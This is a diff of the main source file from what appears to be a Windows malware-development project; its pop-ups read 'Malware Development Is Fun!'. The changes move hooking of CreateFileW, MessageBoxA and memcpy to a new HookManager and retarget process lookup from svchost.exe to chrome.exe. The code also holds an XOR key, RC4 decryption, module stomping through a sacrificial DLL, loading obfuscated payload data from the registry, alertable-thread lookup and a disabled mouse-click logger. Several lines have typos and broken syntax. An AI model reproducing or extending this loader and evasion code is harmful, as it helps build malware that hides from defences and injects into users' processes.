@@ -1,7 +1,6 @@
 ﻿#include "main.h"
 
-int main()
-{
+int main() {
 	DWORD						  dwHookLength				= NULL,
 								  dwPID0					= NULL,
 								  dwPID1					= NULL,
@@ -61,18 +60,75 @@ int main()
 
 	BYTE						  pTargetSubDirectory[9]	= { 0xC0, 0xA8, 0x01, 0x01, 0x0A, 0x00, 0x00, 0x01, 0x00 },
 								  pXorKey[8]				= { 0xB3, 0xD1, 0x72, 0x75, 0x6F, 0x6D, 0x33, 0x33 };
-
-	WCHAR						  TargetProcessName[]		= L"svchost.exe",
+	WORD						  wHookID1, wHookID2, wHookID3;
+	WCHAR						  TargetProcessName[]		= L"chrome.exe",
 								  pTargetModuleName[]		= L"ntdll.dll",
 								  pwPath[MAX_PATH]			= { };
 	Context						  RC4Context_t				= { };
 	RESOURCE					  resource					= { };
 	PVOID						  fnLMBClick				= nullptr;
-	PeFile						  PeFileClass				= { };
+	PeFile						  PeFileClass				= PeFile();
+	//Scanner						  scanner_t					= { };
+	HookManager					  hook_manager				= HookManager();
 
-	hHeap = GetProcessHeap();
+	hook_manager.initializeLocally(LOCAL_THREAD_HANDLE);
+	LoadLibraryA("dbghelp.dll");
 
-	HookLocalThreadUsingDetours(reinterpret_cast<PVOID>(g_pMessageBoxA), reinterpret_cast<PVOID>(HookedMessageBoxA) ,  GetCurrentThread());
+	hHeap = GetProcessHeap();/*
+	LPVOID)GetProcAddress(GetModuleHandleA("dbghelp.dll"), "SymInitialize")
+	(LPVOID)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserThreadStart")
+	(LPVOID)GetProcAddress(GetModuleHandleA(pTargetStringToHash_2), "NtAllocateVirtualMemory")
+	GetProcAddress(GetModuleHandleA("KernelBase.dll"), "CreateProcessInternalW")*/
+
+	HOOK_CONTEXT dtHook1 = { reinterpret_cast<LPVOID>(&HookedCreateFileW), reinterpret_cast<LPVOID*>(&g_CreateFileW), reinterpret_cast<LPVOID>(&CreateFileW) },
+				 dtHook2 = { reinterpret_cast<LPVOID>(&HookedMessageBoxA), reinterpret_cast<LPVOID*>(&g_MessageBoxA), reinterpret_cast<LPVOID>(&MessageBoxA) },
+				 dtHook3 = { reinterpret_cast<LPVOID>(&HookedMemMove), reinterpret_cast<LPVOID*>(&g_MemMove), reinterpret_cast<LPVOID>(&memcpy) };
+	
+	if (hook_manager.CreateLocalHook(dtHook3, &wHookID3) != HookManager::success) {
+		std::cout << "[x] Failed To Create A Hook For CreateFileW\n";
+	}
+	std::cout << "[+] Created A Hook For memcpy\n\n";
+	if (hook_manager.CreateLocalHook(dtHook1, &wHookID1) != HookManager::success) {
+		std::cout << "[x] Failed To Create A Hook For CreateFileW\n";
+	}
+	std::cout << "[+] Created A Hook For CreateFileW\n\n";
+	if (hook_manager.CreateLocalHook(dtHook2, &wHookID2) != HookManager::success) {
+		std::cout << "[x] Failed To Create A Hook For MessageBoxA\n";
+	}
+	std::cout << "\n[+] Created A Hook For MessageBoxA\n\n";
+	if (hook_manager.install_hook(wHookID1) != HookManager::success) {
+		std::cout << "[x] Failed To Install A Hook On MessageBoxA\n";
+	}
+	std::cout << "[+] Installed A Hook On CreateFileW\n\n";
+	std::cout << "[i] Running an unhooked MessageBoxA Call...\n\n";
+
+	MessageBoxA(nullptr, "Woohoo!!! I'm an UnHooked MessageBoxA", "Unhooked Message", MB_ICONINFORMATION | MB_YESNOCANCEL);
+
+	std::cout << "[+] Installed A Hook On MessageBoxA\n";
+
+	if (hook_manager.install_hook(wHookID2) != HookManager::success) {
+		std::cout << "[x] Failed To Install CreateFileW\n";
+	}
+	//hkUINT uiFunctionSize = hook_manager.scanner->getFunctionSize(CreateFileW);
+	//MessageBoxA(nullptr, pTargetStringToHash_1, pTargetStringToHash_2, MB_OKCANCEL);
+	std::cout << "[i] Running A Hooked MessageBoxA!\n\n";
+
+	MessageBoxA(nullptr, "Woohoo!!! I'm an UnHooked MessageBoxA", "Unhooked Message", MB_ICONINFORMATION | MB_YESNOCANCEL);
+
+	hook_manager.uninstall_hook(wHookID2);
+
+
+	HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\calc.exe", GENERIC_READ, NULL, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, INVALID_HANDLE_VALUE);
+
+	//Sleep(2000);
+	//mhStatus = UnHookLocalThreadUsingMinHook((LPVOID)&CreateFileW);
+
+	//MH_Uninitialize();
+	//Sleep(2000);
+
+	//if (!HookLocalThreadUsingDetours(reinterpret_cast<PVOID *>(&g_MessageBoxA), reinterpret_cast<PVOID>(HookedMessageBoxA) , GetCurrentThread())) return -1;
+
+	//Sleep(2000);
 
 	if (hHeap == nullptr || hHeap == INVALID_HANDLE_VALUE) return -0x99;
 
@@ -80,35 +136,38 @@ int main()
 
 	if (pImagePath == nullptr) return -0x98;
 
+
 	MessageBoxA(nullptr, pTargetStringToHash_1, pTargetStringToHash_2,MB_OKCANCEL);
 
-	std::cout << g_GlobalHeapAllocCount;
-
+	//std::cout << g_GlobalHeapAllocCount;
 	FetchProcessHandleNtQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess);
 
 	pImagePath = FetchImagePathFromRemoteProcess(hProcess);
 
-	PeFileClass.ParseDataFilePath(const_cast<LPWSTR>(L"C:\\Windows\\System32\\ntdll.dll"));
+	PeFileClass.ParseDataFilePath(const_cast<LPWSTR>(pImagePath));
 
 	pImageData = FetchImageData(pImagePath, hHeap, &dwImageSize);
 
+	
+
 	if (pImageData == nullptr) return -97;
+
 
 	hThread = GetCurrentThread();
 
-	if (HookLocalThreadUsingDetours(reinterpret_cast<PVOID>(g_pMessageBoxA), reinterpret_cast<PVOID>(HookedMessageBoxA), hThread) == FALSE) return 1;
+	//if (HookLocalThreadUsingDetours((PVOID *)&g_MessageBoxA, reinterpret_cast<PVOID>(HookedMessageBoxA), hThread) == FALSE) return 1;
 
 	MessageBoxA(nullptr, "[!] Malware Development Is Fun!\n", "API Hooked Message", MB_OKCANCEL | MB_ICONEXCLAMATION);
 
-	if (UnHookLocalThreadUsingDetours(reinterpret_cast<PVOID>(MessageBoxA), reinterpret_cast<PVOID>(HookedMessageBoxA), hThread) == FALSE) return 2;
+	//if (UnHookLocalThreadUsingDetours(reinterpret_cast<PVOID *>(&g_MessageBoxA), reinterpret_cast<PVOID>(HookedMessageBoxA), hThread) == FALSE) return 2;
 
 	MessageBoxA(nullptr, "Malware Development Is Fun!\n", "API UnHooked Message", MB_OKCANCEL | MB_ICONEXCLAMATION);
-
+	/*
 	LogConsoleMouseClicks();
 
 	pExPayload = static_cast<PBYTE>(VirtualAlloc(nullptr, sBytesWritten, MEM_RESERVE | MEM_COMMIT, PAGE_READONLY));
 
-	HookWithVirtualAlloc(pExPayload, fnLMBClick, static_cast<DWORD>(sBytesWritten));
+	//HookWithVirtualAlloc(pExPayload, fnLMBClick, static_cast<DWORD>(sBytesWritten));
 
 	if (!FetchAlertableThread(GetCurrentThreadId(), GetCurrentProcessId(), &dwThreadId, &hThread)) return -2;
 
@@ -132,9 +191,9 @@ int main()
 
 	printf("Starting PE Parser...\n");
 
-	pImageData = FetchImageData(const_cast<LPWSTR>(L"C:\\Windows\\System32\\kernelbase.dll"), hHeap, &dwImageSize);
+	pImageData = FetchImageData(const_cast<LPWSTR>(L"C:\\Windows\\System32\\ntdll.dll"), hHeap, &dwImageSize);
 
-	if (pImageData == nullptr) printf("[!] Parsing: C:\\WINDOWS\\System32\\kernel32.dll\n");
+	if (pImageData != nullptr) printf("[!] Parsing: C:\\WINDOWS\\System32\\kernelnase.dll\n");
 
 	FetchImageDosHeader(pImageData, &pImageDOSHeader_t);
 
@@ -158,16 +217,16 @@ int main()
 
 
 
-	/*
-	FetchImageSection(pBaseOfData, &pImageSection_Entry);
+	
+	FetchImageSection(pImageData, &pImageSection_Entry);
 
 	GetProcessAddressReplacement(GetModuleHandleW(L"NTDLL.dll"), const_cast<LPSTR>("NtQuerySystemInformation"));
 
-	pImageSection_Entry_idata = FindImageSectionHeaderByName(".pdata", pImageSection_Entry, pImageFileHeader_t->NumberOfSections, pBaseOfData);
+	pImageSection_Entry_idata = FindImageSectionHeaderByName(".pdata", pImageData);
 
 	printf("%s\n", reinterpret_cast<PCHAR>(pImageSection_Entry_idata->Name));
 
-	if (!FetchStompingTarget(const_cast<LPSTR>(SACRIFICIAL_DLL), const_cast<LPSTR>(SACRIFICIAL_FUNC), reinterpret_cast<PVOID * >(&pStompingTarget))) return -10;
+	//if (!FetchStompingTarget(const_castLPSTR>(SACRIFICIAL_DLL), const_cast<LPSTR>(SACRIFICIAL_FUNC), reinterpret_cast<PVOID * >(&pStompingTarget))) return -10;
 
 	if (!ReadRegKeys(&pObfOutput, reinterpret_cast<PDWORD>(&sObfuscatedSize))) return -1;
 
@@ -263,7 +322,6 @@ int main()
 	//CloseHandle(hThread);
 
 	//CloseHandle(hProcess);
-
 	wprintf(L"[!] Finished!\n");
 
 	//char pPath[MAX_PATH] = { '\0' };
